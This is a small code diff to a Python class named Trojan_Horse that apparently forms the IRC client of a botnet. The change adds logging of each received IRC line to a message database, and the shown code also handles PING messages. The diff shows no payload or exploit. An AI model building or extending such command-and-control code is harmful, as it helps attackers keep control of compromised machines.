@@ -1,10 +1,11 @@
 import socket
 import time
+import modules.database as database
 
 class Trojan_Horse():
  
     def __init__(self):
-        pass
+        self.msg_db = database.MessageDB()
     
     def connect(self, botnet):
         HOST = botnet.irc_addr.split(':')[0]
@@ -52,6 +53,7 @@ class Trojan_Horse():
                 readbuffer = temp.pop()
                 for line in temp:
                     line = line.rstrip()
+                    self.msg_db.insert_message(line)
                     self.line = line.split()
                     # The IRC table tennis 
                     if(self.line[0]=="PING"):
